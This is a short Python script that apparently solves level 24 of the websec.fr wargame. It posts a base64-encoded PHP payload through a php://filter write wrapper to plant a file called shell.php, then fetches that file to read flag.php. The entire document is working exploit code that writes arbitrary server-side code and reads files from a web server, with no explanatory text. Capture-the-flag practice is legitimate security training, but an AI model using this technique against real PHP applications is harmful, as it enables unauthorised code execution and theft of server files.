import requests

from base64 import b64encode

URL = "https://websec.fr/level24/"

s = requests.Session()

r = s.post(URL + "index.php?p=edit&filename=php://filter/write=convert.base64-decode/resource=shell.php", data = {"data": b64encode("<?= print_r(file_get_contents('../../flag.php')); ?>".encode()).decode()})

r = requests.get(URL + f"uploads/{r.cookies['PHPSESSID']}/shell.php")
print(r.text)